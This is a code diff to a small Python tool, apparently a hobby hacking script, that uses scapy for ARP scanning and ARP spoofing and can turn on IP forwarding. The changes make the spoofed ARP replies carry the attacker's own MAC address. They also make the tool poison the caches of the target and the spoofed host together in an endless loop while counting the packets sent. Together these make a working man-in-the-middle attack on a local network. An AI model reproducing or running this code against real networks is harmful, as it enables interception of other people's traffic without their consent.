@@ -18,28 +18,41 @@ class Pirate_pet:
     def scan(ip):
         # TODO del temp if
         if ip == '':
-            ip = '10.0.2.1/24'
+            my_ip = scapy.ARP().psrc
+            ip = f'{ my_ip[:-1] }1/24'
 
         broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
         arp_request = scapy.ARP(pdst=ip)
         arp_broadcast_request = broadcast/arp_request
         
-        answered_list = scapy.srp(arp_broadcast_request, timeout=1, verbose=False)[0]
+        answered_list = scapy.srp(
+            arp_broadcast_request,
+            timeout=1,
+            verbose=False
+        )[0]
         client_list = [{'ip': el[1].psrc, 'mac': el[1].hwsrc} for el in answered_list]
 
         return client_list
 
 
-    def arp_spoof(target_ip, spoof_ip):
+    def arp_spoof(target_ip, spoof_ip, flag=False):
         target_mac = Pirate_pet.scan(target_ip)[0]['mac']
+        
+        if not flag:
+            my_mac = scapy.ARP().hwsrc
+            spoof_mac = my_mac
+        elif flag:
+            spoof_mac = Pirate_pet.scan(spoof_ip)[0]['mac']
 
         packet = scapy.ARP(
             op=2,
             pdst=target_ip,
             hwdst=target_mac,
-            psrc=spoof_ip
+            psrc=spoof_ip,
+            hwsrc=spoof_mac
         )
-        scapy.send(packet)
+
+        scapy.send(packet, verbose=False)
         
 
     def ip_forward(flag):
@@ -57,7 +70,8 @@ command = input('''
     1. mac_chenger
     2. scan
     3. arp_spoof
-    4. ip_forward\n
+    4. ip_forward
+
 inter number command
 > \
 ''')
@@ -80,11 +94,19 @@ elif command == '2':
 elif command == '3':
     spoof_ip = input('inter spoof_ip ')
     target_ip = input('inter target_ip ')
+    print('')
+    sent_packet_cout = 0
 
+    # TODO breack loop ctrl + q
     while True:
         Pirate_pet.arp_spoof(target_ip, spoof_ip)
         Pirate_pet.arp_spoof(spoof_ip, target_ip)
+        
+        sent_packet_cout += 2
         sleep(2)
+
+        print(f'[+] Packet sent: { sent_packet_cout }', end="\r")
+
 
 elif command == '4':
     call(['sysctl', 'net.ipv4.ip_forward'])
@@ -92,5 +114,6 @@ elif command == '4':
     flag = input('inter ip_forward 1 or 0 ')
     
     Pirate_pet.ip_forward(flag)
+
 
 
